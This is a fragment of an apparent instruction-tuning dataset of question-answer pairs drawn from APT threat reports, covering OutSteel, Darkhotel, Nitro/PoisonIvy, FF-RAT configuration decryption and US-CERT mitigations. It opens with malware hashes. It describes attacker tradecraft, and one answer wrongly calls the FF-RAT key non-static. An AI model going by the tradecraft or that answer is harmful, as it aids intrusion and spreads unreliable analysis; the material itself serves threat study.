2762cbc81056348f2816de01e93d43398ba65354252c97928a56031e32ec776f 27868ae50b849506121c36b00d92afe3115ce2f041cc28476db8dfc0cc1d6908 2bef4a398a88749828afac59b773ae8b31c8e4e5b499aad516dd39ada1a11eca 2d9d61ce6c01329808db1ca466c1c5fbf405e4e869ed04c59f0e45d7ad12f25b 3075a467e89643d1f37e9413a2b38328fbec4dd1717ae57128fdf1da2fe39819 320d091b3f8de8688ce3b45cdda64a451ea6c22da1fcea60fe31101eb6f0f6c2 37be3d8810959e63d5b6535164e51f16ccea9ca11d7dab7c1dfaa335affe6e3d 39e8455d21447e32141dc064eb7504c6925f823bf6d9c8ce004d44cb8facc80b 3d7a05e7ba9b3dd84017acab9aab59b459db6c50e9224ec1827cbf0a2aee47db 3f7b0d15f4cbe63e57fb06b57575bf6dd9eb777c737b0886250166768169fc6c 4715a5009de403edd2dd480cf5c78531ee937381f2e69e0fb265b2e9f81f15c4 494122ff204f3dedaa8f0027f9f98971b32c50acbcce4efa8de0498efa148365 4c8a433ed99cc4b6994b2e1df59eb171f326373ba100a3653eb37e8a8ee2e6f2 4d59a7739f15c17f144587762447d5abb81c01f16224a3f7ce5897d1b6f7ee77 4ee84419fb9267081480954f1be176095a45fe299078dfa95f980e513b46a020 4fdc37f59801976606849882095992efecee0931ece77d74015113123643796e 506c90747976c4cc3296a4a8b85f388ab97b6c1cfae11096f95977641b8f8b6f 56731c777896837782beff4432330486a941e4f3af44b4d24be7c62c16e96256 5fc108db5114be4174cb9365f86a17e25164a05cc1e90ef9ee29ab30abed3a13 619393d5caf08cf12e3e447e71b139a064978216122e40f769ac8838a7edfca4 61f5e96ec124fef0c11d8152ee7c6441da0ea954534ace3f5f5ec631dd4f1196 6a698edb366f25f156e4b481639903d816c5f5525668f65e2c097ef682afc269 6ee2fd3994acdbb9a1b1680ccd3ac4b7dcb077b30b44c8677252202a03dccf79 700b05fede8afe3573b6fec81452d4b09c29adb003cdacb762c8b53d84709901 707971879e65cbd70fd371ae76767d3a7bff028b56204ca64f27e93609c8c473\n71e9cc55f159f2cec96de4f15b3c94c2b076f97d5d8cecb60b8857e7a8113a35 7419f0798c70888e7197f69ed1091620b2c6fbefead086b5faf23badf0474044 750c447d6e3c7d74ccab736a0082ef437b1cd2000d761d3aff2b73227457b29c 75f728fa692347e096386acd19a5da9b02dca372b66918be7171c522d9c6b42d 7963f8606e4c0e7502a813969a04e1266e7cd20708bef19c338e8933c1b85eda 7b3d377ca2f6f9ea48265a80355fe6dc622a9b4b43855a9ddec7eb5e4666a1d4 7d7d9a9df8b8ffd0a0c652a3d41b9a5352efb19424e42942aaf26196c9698019 7e1355e51eb9c38e006368de1ae80b268ffab6918237696474f50802e3d8a9c8 7eb1dc1719f0918828cc8349ee56ca5e6bbde7cada3bc67a11d7ff7f420c7871 7ee8cfde9e4c718af6783ddd8341d63c4919851ba6418b599b2f3c2ac8d70a32 82d2779e90cbc9078aa70d7dc6957ff0d6d06c127701c820971c9c572ba3058e 89da9a4a5c26b7818e5660b33941b45c8838fa7cfa15685adfe83ff84463799a 8ab3879ed4b1601feb0de11637c9c4d1baeb5266f399d822f565299e5c1cd0c4 9528a97d8d73b0dbed2ac496991f0a2eecc5a857d22e994d227ae7c3bef7296f 975f9ce0769a079e99f06870122e9c4d394dfd51a6020818feeef9ccdb8b0614 9917c962b7e0a36592c4740d193adbd31bc1eae748d2b441e77817d648487cff 9a72e56ac0f1badd3ca761b53e9998a7e0525f2055dbec01d867f62bdb30418e 9cf4b83688dd5035623182d6a895c61e1e71ea02dc3e474111810f6641df1d69 9d7c3463d4a4f4390313c214c7a79042b4525ae639e151b5ec8a560b0dd5bd0a 9ec80626504ca869f5e731aef720e446936333aaf6ab32bae03c0de3c2299f34 9ee1a587acaddb45481aebd5778a6c293fe94f70fe89b4961098eb7ba32624a8 9ef2d114c329c169e7b62f89a02d3f7395cb487fcd6cff4e7cac1eb198407ba6 9fbeb629ea0dc72ac8db680855984d51b28c1195e48abff2e68b0228f49d5b0f a61725f3b57fd45487688ad06f152d0db139a6cb29f3515ea90ffe15cb7e9a7a a9a89bb76c6f06277b729bc2de5e1aaef05fc0d9675edbc0895c7591c35f17eb afdc010fc134b0b4a8b8788d084c6b0cff9ea255d84032571e038f1a29b56d0a b02c420e6f8a977cd254cd69281a7e8ce8026bda3fc594e1fc550c3b5e41565d b0b0cb50456a989114468733428ca9ef8096b18bce256634811ddf81f2119274 b0b4550ba09080e02c8a15cec8b5aeaa9fbb193cec1d92c793bdede78a70cec6 b1af67bcfaa99c369960580f86e7c1a42fc473dd85a0a4d3b1c989a6bc138a42 b2f5edef0e599005e205443b20f6ffd9804681b260eec52fa2f7533622f46a6c b6e34665dd0d045c2c79bf3148f34da0b877514a6b083b7c8c7e2577362463b3 b72188ba545ad865eb34954afbbdf2c9e8ebc465a87c5122cebb711f41005939 b83c41763b5e861e15614d3d6ab8573c7948bf176143ee4142516e9b8bcb4423 b8ce958f56087c6cd55fa2131a1cd3256063e7c73adf36af313054b0f17b7b43 bd83e801b836906bab4854351b4d6000e0a435736524a504b9839b5f7bdf97cc c222122fe3e1206ba2363c17fb37ae2f8e271840e17b3bb9ba5359f2793f9574 c33a905e513005cee9071ed10933b8e6a11be2335755660e3f7b2adf554f704a c532d19652ea6d4e0ebb509766de1ec594dd80152f92f7ef6b80ad29d2aa8cf4 c6c47d3d7e56213f0d0ced379c64e166ed5a86308ea96856163a4e0155b1fc6e cb4a93864a19fc14c1e5221912f8e7f409b5b8d835f1b3acc3712b80e4a909f1 cb6c05b2e9d8e3c384b7eabacde32fc3ac2f9663c63b9908e876712582bf2293 cce564eb25a80549d746c180832d0b3d45dcd4419d9454470bfd7517868d0e10 cd93f6df63187e3ac31ea56339f9b859b0f4fbe3e73e1c07192cef4c9a6f8b08 d4d4aa7d621379645d28f3a16b3ba41b971216869f5448ea5c1fc2e78cfecb26 d6e2a79bc87d48819fabe332dd3539f572605bb6091d34ae7d25ae0934b606b5 db8975fd6c04a7d3790eb73ab8e95b6dbf6c9d65ad5c6a6d3c862d0284f87c34 df3b1ad5445d628c24c1308aa6cb476bd9a06f0095a2b285927964339866b2c3 dfc24fa837b6cd3210e7ea0802db3dcf7bb1f85bff2c1b4bda4c3c599821bf8c e0c46e23bd1b5b96123e0c64914484bbfae7a7ad13cbd45184035d4c0f8a10a2 e8207e8c31a8613112223d126d4f12e7a5f8caf4acaaf40834302ce49f37cc9c e9a858127f5f6e5e0e94ed655a2bf9ed228f87bc99d9b12113e27dcc84be3909 ebbf30e06de3a25f76cf43c72c521d14a27053e4d9be566b41f50c41bea3a7a9 ec3c0afccfef11f753a408c859d98bbba4841e87f7f1a48573270c0d82252b03 ec62c984941954f0eb4f3e8baee455410a9dc0deb222360d376e28981c53b1a0 ec8868287e3f0f851ff7a2b0e7352055b591a2b2cb1c2a76c53885dee66562dc\nf24ee966ef2dd31204b900b5c7eb7e367bc18ff92a13422d800c25dbb1de1e99 f2bdde99f9f6db249f4f0cb1fb8208198ac5bf55976a94f6a1cebfb0d6c30551 f4a56c86e2903d509ede20609182fbe001b3a3ca05f8c23c597189935d4f71b8 f58c41d83c0f1c1e8c1c3bd99ab6deabb14a763b54a3c5f1e821210c0536c3ff fa1bc7d6f03a49af50f7153814a078a32f24f353c9cb2b8e3f329888f2b37a6e fad2e8293cf38eec695b1b5c012e187999bd94fbcad91d8f110605a9709c31b3 ff07325f5454c46e883fefc7106829f75c27e3aaf312eb3ab50525faba51c23c ffad5217eb782aced4ab2c746b49891b496e1b90331ca24186f8349a5fa71a28\n\nBased on the provided section, what are the primary goals of the threat group behind the attack on the energy organization in Ukraine? Explain how the use of the OutSteel payload aligns with these goals.",
    "output": "The primary goals of the threat group behind the attack on the energy organization in Ukraine are to steal sensitive information for the purpose of situational awareness and leverage in dealing with Ukraine. The use of the OutSteel payload aligns with these goals because it is capable of automatically exfiltrating various types of files, including documents, archives, database files, and files containing email-related data. By exfiltrating these files, the threat group can gain valuable insights into the operations and communications of the targeted organization, enhancing their situational awareness and providing leverage in negotiations or strategic planning.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Darkhotel APT exploit CVE-2014-0497 to target specific systems connected to the Internet through Chinese ISPs?",
    "output": "CVE-2014-0497 is an integer underflow vulnerability in Adobe Flash Player that allows remote attackers to execute arbitrary code via unspecified vectors. The Darkhotel APT exploited this vulnerability by embedding Flash objects in Korean documents, which were then sent to target systems connected to the Internet through Chinese ISPs. The Flash objects were designed to handle hardened Windows 8.1 systems, and once executed, they delivered malcode similar to the 'Information Stealer' component functionality. This exploit was part of the Darkhotel APT's spear-phishing campaign, which targeted defense industrial base (DIB), government, and NGO organizations. The use of CVE-2014-0497 demonstrates the Darkhotel APT's ability to deploy 0-day exploits to achieve their goals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INTRODUCTION\nOn September 25, 2015, President Barack Obama and Chinese President Xi Jinping agreed that neither government would \"conduct or knowingly support cyber-enabled theft of intellectual property\"1 for an economic advantage. Some observers hailed the agreement as a game changer for U.S. and Chinese relations, while skeptics saw this as little more than a diplomatic formality unlikely to stymie years of state-sponsored intellectual property theft.2 3 Since the agreement, there has been much discussion and speculation as to what impact, if any, it would have on Chinese cyber operations.\nTo investigate this question, FireEye iSIGHT Intelligence reviewed the activity of 72 groups that we suspect are operating in China or otherwise support Chinese state interests. Going back nearly three and a half years to early 2013, our analysis paints a complex picture, leading us to assess that a range of political, economic, and other forces were contributing to a shift in Chinese cyber operations more than a year prior to the Xi-Obama agreement.\nBetween September 2015 and June 2016, we observed 13 active China-based groups conduct multiple instances of network compromise against corporations in the U.S., Europe, and Japan. During this same timeframe, other China-based groups targeted organizations in Russia and the Asia Pacific region. However, since mid-2014, we have observed an overall decrease in successful network compromises by China-based groups against organizations in the U.S. and 25 other countries. These shifts have coincided with ongoing political and military reforms in China, widespread exposure of Chinese cyber activity, and unprecedented action by the U.S. Government.\n1  https://www.whitehouse.gov/the-press-office/2015/09/25/fact-sheet-president-xi-jinpings-state-visit-united-states\n2  http://www.cnn.com/2015/09/25/politics/us-china-cyber-theft-hack/\n3  https://freedomhouse.org/blog/obama-xi-agreement-will-not-resolve-china-cybersecurity-threat\n\nAnswer this question based on the above context: How did the agreement between President Barack Obama and Chinese President Xi Jinping on September 25, 2015, influence the cyber operations of China-based groups? What factors contributed to the observed shifts in these operations both before and after the agreement?",
    "output": "The agreement between President Barack Obama and Chinese President Xi Jinping on September 25, 2015, aimed to curb cyber-enabled theft of intellectual property for economic advantage. While some viewed this agreement as a potential game changer, others remained skeptical about its effectiveness. FireEye iSIGHT Intelligence analyzed the activities of 72 groups suspected of operating in China or supporting Chinese state interests over a period of nearly three and a half years starting from early 2013. Their analysis revealed a complex picture indicating that various political, economic, and other forces had already begun influencing a shift in Chinese cyber operations more than a year before the Xi-Obama agreement. Between September 2015 and June 2016, 13 active China-based groups conducted multiple network compromises against corporations in the U.S., Europe, and Japan, while other groups targeted organizations in Russia and the Asia Pacific region. However, since mid-2014, there was an overall decrease in successful network compromises by China-based groups against organizations in the U.S. and 25 other countries. These shifts coincided with ongoing political and military reforms in China, widespread exposure of Chinese cyber activity, and unprecedented action by the U.S. Government.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 7. Appendix I\nTrojan.FF-\u00ad\u2010RAT consists of a configuration\t\n \u00a0file that in\t\n \u00a0this case was always found\t\n \u00a0under: C:\\Windows\\Media\\Windows Config.wav. This configuration file is RC4\t\n \u00a0encrypted and aPACK\t\n \u00a0compressed. This section will demonstrate how an analyst can decrypt and decompress this file to\t\n \u00a0reveal the configuration information.\nFirst we\t\n  need to understand the\t\n  structure\t\n  of an aPACK\t\n  compressed file. So, we\t\n  start with a\t\n  test file\t\n  that we\t\n  compress using the appack.exe12 utility.\nNext we use the appack.exe utility to compress this file by running:\t\n  appack.exe c\t\n  test.txt test.ap32.\t\n  The aPACK compressed file consists\t\n  of the following structure:\n-\u00ad\u2010 1st DWORD \u2013 aPACK magic header\n-\u00ad\u2010 2nd DWORD \u2013 Total Header length (i.e. the first 6 DWORDs)\n-\u00ad\u2010 3rd DWORD \u2013 Length of compressed data\n-\u00ad\u2010 4th DWORD \u2013 CRC32 hash of compressed data\n-\u00ad\u2010 5th DWORD \u2013 Length of decompressed data\n-\u00ad\u2010 6th DWORD \u2013 CRC32 hash of decompressed data\n-\u00ad\u2010 The rest of the bytes are the compressed data.\nThis structure is depicted below:\nNow we go back to a sample Windows Config.wav file. This file has the following structure:\n-\u00ad\u2010 1st DWORD \u2013 Hardcoded value (0x19860609), which may represent a date, that is, YYYYMMDD or YYYYDDMM.\n-\u00ad\u2010 2nd DWORD \u2013 Obfuscated RC4 key.  De-obfuscated by XOR-ing with 1st DWORD.\n-\u00ad\u2010 3rd DWORD \u2013 NULLs\n-\u00ad\u2010 4th DWORD \u2013 Same hardcoded value as 1st DWORD.\n-\u00ad\u2010 5th DWORD \u2013 Length of compressed data\n-\u00ad\u2010 6th DWORD \u2013 Length of decompressed data.\n-\u00ad\u2010 The rest of the data is aPACK compressed and RC4 encrypted (offset 0x18 \u2013 end)\n12 http://www.ibsensoftware.com/files/aPLib-\u00ad\u20101.01.zip\nThis structure is demonstrated below:\nThe RC4\t\n \u00a0key is derived by XOR-\u00ad\u2010ing \t\n \u00a0the \t\n \u00a0first \t\n \u00a0two \t\n \u00a0DWORDs.\t\n \u00a0\t\n \u00a0In \t\n \u00a0this \t\n \u00a0case:\t\n \u00a00x19860609\t\n \u00a0XOR 0x19865733\t\n \u00a0=\t\n \u00a00x0000513A.\t\n \u00a0The Trojan then prints the ASCII version of\t\n \u00a00x0000513A, so essentially our\t\n \u00a0RC4 key is 64-\u00ad\u2010bits long as shown\t\n \u00a0below:\nSo using RC4 key 0x3030303035313341 we now decrypt the data in\t\n  the Windows Config.wav file starting at\t\n  file offset\t\n  0x18 until the end. The\t\n  decryption operation results in this data:\nThe RC4\t\n  decrypted data\t\n  is aPACK\t\n  compressed but without the header. We actually do\t\n  have all the pieces of the header except one: the CRC32 of\t\n  the decompressed data. Lets list\t\n  the structure of\t\n  the aPACK compressed file to demonstrate by referencing figure 61:\n-\u00ad\u2010 1st DWORD \u2013 AP32 (we can create this ourselves)\n-\u00ad\u2010 2nd DWORD \u2013 Length of the header (we can create this ourselves, i.e. 0x18000000)\n-\u00ad\u2010 3rd DWORD \u2013 Length of compressed data (we have this from the configuration file figure 62 (i.e. 0xBE000000))\n-\u00ad\u2010 4th DWORD \u2013 CRC32 of compressed data (we can calculate this ourselves since we have the data)\n-\u00ad\u2010 5th DWORD \u2013 Length of decompressed data (we have this from the configuration file figure 62 (i.e. 0xC0060000))\n-\u00ad\u2010 6th DWORD \u2013 CRC32 of decompressed data (we have no way of knowing or calculating this since we do not have the decompressed data)\nSo, we\t\n  are\t\n  missing \t\n  one \t\n  critical\t\n  piece \t\n  of \t\n  information, \t\n  namely \t\n  the \t\n  CRC32 \t\n  hash \t\n  value \t\n  of \t\n  the \t\n  decompressed \t\n  data, \t\n  and \t\n  there \t\n  is \t\n  no \t\n  way \t\n  of generating\t\n  or knowing\t\n  this in advance\t\n  since\t\n  we\t\n  are\t\n  trying\t\n  to decompress the\t\n  data. Lets put an aPACK\t\n  header together with the\t\n  information we have along\t\n  with the\t\n  data\t\n  we\t\n  decrypted (figure\t\n  64),\t\n  and \t\n  add \t\n  NULLs \t\n  for \t\n  the \t\n  6th DWORD\t\n  since we do not have this information:\nWhen we execute the appack.exe tool to\t\n  decompress this file we get an\t\n  error message:\nIt is obvious that the appack.exe utility is throwing this error\t\n  because the CRC32 of\t\n  the decompressed data does not\t\n  match what\t\n  it calculates\t\n  after it is\t\n  done decompressing the file. So, we need to get around this error by identifying and modifying the code in appack.exe\t\n  where\t\n  this CRC32\t\n  hash\t\n  check is made in\t\n  order to\t\n  make the utility continue executing regardless of whether the CRC32 hash\t\n  of the decompressed\t\n  data matches what is on\t\n  the header.\nA\t\n  little debugging of this tool leads us to\t\n  the code responsible for this CRC32 check. The code is shown\t\n  below:\nAt address 0x00402C09\t\n \u00a0we see a\t\n \u00a0conditional jump-\u00ad\u2010if-\u00ad\u2010equal (JE), which means that if the\t\n \u00a0CRC32 hash of the\t\n \u00a0decompressed data\t\n \u00a0matches the value of the 6th DWORD\t\n \u00a0in the header, the jump will be taken. We can modify the code of this utility to make the jump here unconditional\t\n \u00a0(JMP) \t\n \u00a0thus \t\n \u00a0make \t\n \u00a0the \t\n \u00a0utility \t\n \u00a0think \t\n \u00a0that \t\n \u00a0the \t\n \u00a0CRC32 \t\n \u00a0check \t\n \u00a0is \t\n \u00a0always \t\n \u00a0successful.\nWe can permanently patch the appack.exe file by using a Hex editor and changing byte 0x74 with 0xEB. This particular instruction \t\n \u00a0is located \t\n \u00a0at \t\n \u00a0file-\u00ad\u2010offset 0x2009 as shown below:\nNow, when we execute this patched version of appack.exe we successfully decompress any Trojan.FF-\u00ad\u2010RAT configuration\t\n \u00a0file:\nThe relevant parts of the decrypted configuration file are shown\t\n  below:\n\nExplain the significance of the RC4 key derivation process in the context of analyzing the Trojan.FF-RAT configuration file, and how does this process enhance the security of the malware?",
    "output": "A: The RC4 key derivation process for the Trojan.FF-RAT configuration file involves XOR-ing the first two DWORDs of the file. This process is significant because it adds a layer of complexity to the encryption, making it harder for analysts to decrypt the file without understanding the specific structure and obfuscation techniques used. By deriving the key from the file itself, the malware enhances its security by ensuring that the key is not static and is tied to the specific instance of the malware. This makes it more challenging for automated tools to decrypt the configuration file without human intervention and analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Targets\nThe attackers have changed their targets over time. From late April to early May, the attackers focused on human rights related NGOs. They then moved on to the motor industry in late May. From June until mid-July no activity was detected. At this point, the current attack campaign against the chemical industry began. This particular attack has lasted much longer than previous attacks, spanning two and a half months.\nA total of 29 companies in the chemical sector were confirmed to be targeted in this attack wave and another 19 in various other sectors, primarily the defense sector, were seen to be affected as well. These 48 companies are the minimum number of companies targeted and likely other companies were also targeted. In a recent two week period, 101 unique IP addresses contacted a command and control server with traffic consistent with an infected machine.  These IPs represented 52 different unique Internet Service Providers or organizations in 20 countries.\nCompanies affected include:\n\u2022 Multiple Fortune 100 companies involved in research and development of chemical compounds and advanced materials.\n\u2022 Companies that develop advanced materials primarily for military vehicles.\n\u2022 Companies involved in developing manufacturing infrastructure for the chemical and advanced materials industry.\nBig Headline: Attack methodology\nThe attackers first researched desired targets and then sent an email specifically to the target. Each organization typically only saw a handful of employees at the receiving end of these emails. However, in one organization almost 500 recipients received a mail, while in two other organizations, more than 100 were selected. While the attackers used different pretexts when sending these malicious emails, two methodologies stood out. First, when a specific recipient was targeted, the mails often purported to be meeting invitations from established business partners. Secondly, when the emails were being sent to a broad set of recipients, the mails purported to be a necessary security update. The emails then contained an attachment that was either an executable that appeared to be a text file based on the file name and icon, or a password-protected archive containing an executable file with the password provided in the email. In both cases, the executable file was a self-extracting executable containing PoisonIvy, a common backdoor Trojan developed by a Chinese speaker.\nWhen the recipient attempted to open the attachment, they would inadvertently execute the file, causing Poi-sonIvy to be installed.  Once PoisonIvy was installed, it contacted a C&C server on TCP port 80 using an encrypted communication protocol. Using the C&C server, the attackers then instructed the compromised computer to provide the infected computer's IP address, the names of all other computers in the workgroup or domain, and dumps of Windows cached password hashes.\nBy using access to additional computers through the currently logged on user or cracked passwords through dumped hashes, the attackers then began traversing the network infecting additional computers. Typically, their primary goal is to obtain domain administrator credentials and/or gain access to a system storing intellectual property. Domain administrator credentials make it easier for the attacker to find servers hosting the desired intellectual property and gain access to the sensitive materials. The attackers may have also downloaded and installed additional tools to penetrate the network further.\nWhile the behavior of the attackers differs slightly in each compromise, generally once the attackers have identified the desired intellectual property, they copy the content to archives on internal systems they use as internal staging servers. This content is then uploaded to a remote site outside of the compromised organization completing the attack.\nBig Headline: Geographic Spread\nFigure 1 shows the location of infected computers. This data is derived from the IP addresses of machines connecting back to the command and control server. The majority of infected machines are located in the US, Bangladesh and the UK; however, overall there is wide geographical spread of infections.\nFigure 1\nGeographic location of infected computers\nFigure 2\nCountry of origin of targeted organizations*\nThere are two possible explanations for this:\n\u2022 The attackers are targeting sites, or individuals in certain sites, which they know have access to certain data that is of interest to the attacker.\n\u2022 The attackers are targeting sites or individuals that they believe have less security measures in place and are therefore an easier access point into the victims' networks.\nWe can conclude that the attackers are not targeting organizations in a particular country.\nBig Headline: Attribution\nThe attacks were traced back to a computer system that was a virtual private server (VPS) located in the United States. However, the system was owned by a 20-something male located in the Hebei region in China. We internally have given him the pseudonym of Covert Grove based on a literal translation of his name.  He attended a vocational school for a short period of time specializing in network security and has limited work experience, most recently maintaining multiple network domains of the vocational school.\nCovert Grove claimed to have the U.S.-based VPS for the sole purpose of using the VPS to log into the QQ instant message system, a popular instant messaging system in China. By owning a VPS, he would have a static IP address. He claims this was the sole purpose of the VPS. And by having a static IP address, he could use a feature provided by QQ to restrict login access to particular IP addresses. The VPS cost was RMB200 (US$32) a month. While possible, with an expense of RMB200 a month for such protection and the usage of a US-based VPS, the scenario seems suspicious. We were unable to recover any evidence the VPS was used by any other authorized or unauthorized users. Further, when prompted regarding hacking skills, Covert Grove immediately provided a contact that would perform 'hacking for hire'. Whether this contact is merely an alias or a different individual has not been determined.\nWe are unable to determine if Covert Grove is the sole attacker or if he has a direct or only indirect role.  Nor are we able to definitively determine if he is hacking these targets on behalf of another party or multiple parties.\nMedium Headline: Delivery\nThe method of delivery has changed over time as the attackers have changed targets. Older attacks involved a self-extracting archive with a suggestive name, for example: \"Human right report of north Africa under the war. scr\". The most recent attacks focusing on the chemical industry are using password-protected 7zip files which, when extracted, contain a self-extracting executable. The password to extract the 7zip file is included in the email. This extra stage is used to prevent automated systems from extracting the self-extracting archive. Some example file names using this technique include:\n\u2022 AntiVirus_update_package.7z\n\u2022 acquisition.7z\n\u2022 offer.7z\n\u2022 update_flashplayer10ax.7z\nAn example of an email used to send the attachment can be seen in figure 3.\nThe email is quite generic, applicable to any corporate user.  Some of the subject lines will vary and may include the name of the targeted company in an attempt to be more convincing.\nMedium Headline: Threat details\nWhen the self-extracting archive file is executed, it will drop two files.  Examples of file names that are used include:\n\u2022 %Temp%\\happiness.txt\n\u2022 %Temp%\\xxxx.exe\nThe executable file, xxxx.exe in this case, is then executed. The second file, happiness.txt, contains custom code in binary format that is encrypted and used by xxxx.exe.  The xxxx.exe file copies happiness.txt to C:\\PROGRAM FILES\\common files\\ ODBC\\ODUBC.DLL and to C:\\WINDOWS\\system32\\jql.sys. It then loads the contents of the encrypted file and injects it into the explorer.exe and iexplore.exe processes.\nFigure 3\nMalicious email\nThe injected code copies xxxx.exe to %System%\\winsys.exe and connects to the Command and Control (C&C) server on TCP port 80.\nThe communication with the server is a handshake using an encryption algorithm (Camellia). Once the Trojan establishes the server's authenticity, it expects a variable-size block of binary code that is read from the server straight into the virtual space for iexplore.exe and then executed.\nWhen an executable is compiled, the compiler will store some metadata in the compiled executable. One particular piece of relevant metadata is the location of the compiled code on disk. The path in this instance contained Chinese characters and was:\nC:\\Documents and Settings\\Administrator\\\u684c\u9762\\\u65b0\u5efa\u6587\u4ef6\u5939\\\u8bfb\u53d6\u6587\u4ef6\\Release\\\u8bfb\u53d6\u6587\u4ef6.pdb\nThis translates to:\nC:\\Documents and Settings\\Administrator\\[Desktop]\\[New Folder]\\[read the file]\\Release\\[read the file].pdb\nBig Headline: Related Attacks\nSeveral other hacker groups have also\nTable 1\nbegun targeting some of the same chemical companies in this time period. Attackers are sending malicious PDF and DOC files, which use exploits to drop variants of Backdoor.Sogu. This particular threat was also used by hackers to compromise a Korean social network site to steal records of 35 million users.\nDetermining if the two groups are related is difficult, but any relationship appears unlikely. The attackers described in this document use a very basic delivery platform; compressed self-extracting archives sometimes sent to a large number of recipients. The Sogu gang, in contrast, use PDF and DOC files in very tailored, targeted emails. The Sogu gang use a custom developed threat \u2013 Backdoor.Sogu, whereas the group described in this document use an off the shelf threat \u2013 Poison Ivy.  While the number of Sogu targets is currently small relative to the Poison Ivy attacks, we continue to monitor their activities.\n\nHow did the attackers change their targets over time during the Nitro attacks, and what was the duration of the attack on the chemical industry?",
    "output": "A: The attackers initially targeted human rights related NGOs from late April to early May, then shifted to the motor industry in late May. After a period of inactivity from June until mid-July, they began targeting the chemical industry. This particular attack on the chemical industry lasted for two and a half months.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Tactical Mitigations\nImplement the indicators of compromise within your systems for detection and mitigation purposes.\nEncourage users to transfer critical files to network shares, to allow for central backed up.\nExecute daily backups of all critical systems.\nPeriodically execute an \"offline\" backup of critical files to removable media.\nEstablish emergency communications plans should network resources become unavailable.\nIsolate any critical networks (including operations networks) from business systems.\nIdentify critical systems and evaluate the need for having on-hand spares to quickly restore service.\nEnsure antivirus is up to date.\nDisable credential caching for all desktop devices with particular importance on critical systems such as servers and restrict the number of cached credential for all portable devices to no more than three if possible. This can be accomplished through a Group Policy Object (GPO).\nDisable AutoRun and Autoplay for any removable media device.\nPrevent or limit the use of all removable media devices on systems to limit the spread or introduction of malicious software and possible exfiltration data, except where there is a valid business case for use. This business case must be approved by the organization Chief IT Security Officer, with policy/guidance on how such media should be used.\nConsider restricting account privileges. It is our recommendation that all daily operations should be executed using standard user accounts unless administrative privileges are required for that specific function. Configure all standard user accounts to prevent the execution and installation of any unknown or unauthorized software. Both standard and administrative accounts should have access only to services required for nominal daily duties, enforcing the concept of separation of duties. Lastly, disable Web and email capabilities on administrative accounts. Compromise of admin accounts is one vector that allows malicious activity to become truly persistent in a network environment.\nEnsure that password policy rules are enforced and Admin password values are changed periodically.\nConsider prohibiting hosts within the production environment or DMZ from sharing an Active Directory enterprise with hosts on other networks. Each environment should have separate forests within Active Directory, with no trust relationships allowed between the forests if at all possible. If necessary, the trust relationships should be one-way with the low integrity environment trusting the higher integrity environment.\nConsider deployment of a coaching page with click through acceptance; these are traditionally deployed in an environment to log the acceptance of network acceptable use policy or to notify users of monitoring. Coaching pages also provide some measure of protection from automated malicious activity. This occurs because automated malware is normally incapable of physically clicking an acceptance radial button. Automated malware is traditionally hardcoded to execute, then retrieve commands or additional executables from the Internet. If the malware is unable to initiate an active connection, the full train of infection is potentially halted. The danger still exists that the physical user will authorize access, but through the use of coaching pages, infections can be limited or at least the rate of infection reduced.\nMonitor logs -- Maintain and actively monitor a centralized logging solution that keeps track of all anomalous and potentially malicious activity.\nEnsure that all network operating systems, web browsers, and other related network hardware and software remain updated with all current patches and fixes.\nSmall Headline: Strategic Mitigations\nOrganizations should review Security Tip (<https://www.us-cert.gov/ncas/tips/ST13-003>)Handling Destructive Malware #ST13-003 and evaluate their capabilities encompassing planning, preparation, detection, and response for such an event.\nAlways keep your patch levels up to date, especially on computers that host public services accessible through the firewall, such as HTTP, FTP, mail, and DNS services.\nBuild host systems, especially critical systems such as servers, with only essential applications and components required to perform the intended function. Any unused applications or functions should be removed or disabled, if possible, to limit the attack surface of the host.\nImplement network segmentation through V-LANs to limit the spread of malware.\nConsider the deployment of Software Restriction Policy set to only allow the execution of approved software (application whitelisting)\nRecommend the whitelisting of legitimate executable directories to prevent the execution of potentially malicious binaries.\nConsider the use of two-factor authentication methods for accessing privileged root level accounts or systems.\nConsider deploying a two-factor authentication through a hardened IPsec/VPN gateway with split-tunneling prohibited for secure remote access.\nDeny direct Internet access, except through the use of proxies for Enterprise servers and workstations. Perform regular content filtering at the proxies or external firewall points of presence. Also consider the deployment of an explicit versus transparent proxy policy.\nImplement a Secure Socket Layer (SSL) inspection capability to inspect both ingress and egress encrypted network traffic for potential malicious activity.\nIsolate network services, such as email and Web application servers by utilizing a secure multi-tenant virtualization technology. This will limit the damage sustained from a compromise or attack of a single network component.\nImplement best practice guidance and policy to restrict the use of non-Foundation assets for processing or accessing Foundation-controlled data or systems (e.g., working from home, or using a personal device while at the office). It is difficult to enforce corporate policies, detect intrusions, and conduct forensic analysis or remediate compromises on non-corporate owned devices.\nMinimize network exposure for all control system devices. Control system devices should not directly face the Internet.\nPlace control system networks behind firewalls, and isolate or air gap them from the business network.\nWhen remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing that VPN is only as secure as the connected devices.\nIndustrial Control System (ICS)-CERT and US-CERT remind organizations to perform proper impact analysis and risk assessment prior to taking defensive measures.\nQuestion: According to the TA14-353A_wiper APT report, what is the significance of disabling credential caching for all desktop devices, particularly critical systems like servers, and how can this be achieved through a Group Policy Object (GPO)?",
    "output": "Answer: Disabling credential caching is significant because it prevents stored credentials from being accessed by unauthorized users or malware, thereby enhancing security. For critical systems like servers, this is particularly important to prevent potential breaches. This can be achieved through a Group Policy Object (GPO) by configuring settings to disable credential caching and restricting the number of cached credentials to no more than three for portable devices. This ensures that even if a device is compromised, the attacker cannot easily gain access to other systems using cached credentials.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
